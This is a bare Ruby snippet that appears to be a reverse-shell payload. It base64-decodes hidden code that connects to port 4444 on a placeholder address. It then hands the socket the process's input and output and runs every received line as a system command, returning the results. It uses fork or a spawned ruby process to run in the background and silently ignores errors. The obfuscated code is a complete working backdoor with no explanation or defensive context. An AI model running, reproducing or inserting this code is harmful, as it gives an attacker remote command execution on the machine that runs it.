code = %(cmVxdWlyZSAnc29ja2V0JztjPVRDUFNvY2tldC5uZXcoIjAuMC4wLjAiLCA0NDQ0KTskc3RkaW4ucmVvcGVuKGMpOyRzdGRvdXQucmVvcGVuKGMpOyRzdGRlcnIucmVvcGVuKGMpOyRzdGRpbi5lYWNoX2xpbmV7fGx8bD1sLnN0cmlwO25leHQgaWYgbC5sZW5ndGg9PTA7KElPLnBvcGVuKGwsInJiIil7fGZkfCBmZC5lYWNoX2xpbmUge3xvfCBjLnB1dHMoby5zdHJpcCkgfX0pIHJlc2N1ZSBuaWwgfQ==).unpack(%(m0)).first
if RUBY_PLATFORM =~ /mswin|mingw|win32/
inp = IO.popen(%(ruby), %(wb)) rescue nil
if inp
inp.write(code)
inp.close
end
else
if ! Process.fork()
eval(code) rescue nil
end
end